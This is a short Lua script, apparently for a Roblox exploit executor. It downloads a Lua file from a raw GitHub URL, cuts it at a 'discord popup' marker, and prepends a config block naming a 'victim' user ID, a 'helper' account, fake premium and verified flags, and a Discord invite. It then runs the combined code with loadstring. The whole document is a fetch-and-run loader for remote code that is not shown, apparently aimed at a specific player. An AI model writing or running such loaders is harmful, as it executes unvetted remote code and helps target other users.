local url = "https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"
local src = game:HttpGet(url)
local cut = src:find("%-%- discord popup")
local body = src:sub(cut)

local header = [==[
local cfg = { victim = 2736715, helper = "nordkoreanischerafafe", premium = true, verified = false, join = "discord.gg/rivalscomp" }
setmetatable(cfg, { __index = function(_, k)
    if k == "level" or k == "streak" or k == "elo" then return 0 end
    if k == "platform" then return "DESKTOP" end
    if k == "helper" then return "" end
    if k == "join" then return "discord.gg/rivalscomp" end
    return nil
end })
local victim, helper, level, streak, elo, keys, premium, verified, unlockall =
    cfg.victim, cfg.helper, cfg.level, cfg.streak, cfg.elo, cfg.keys, cfg.premium, cfg.verified, cfg.unlockall
local join = cfg.join
local platform = tostring(cfg.platform):upper()

]==]

loadstring(header .. body)()
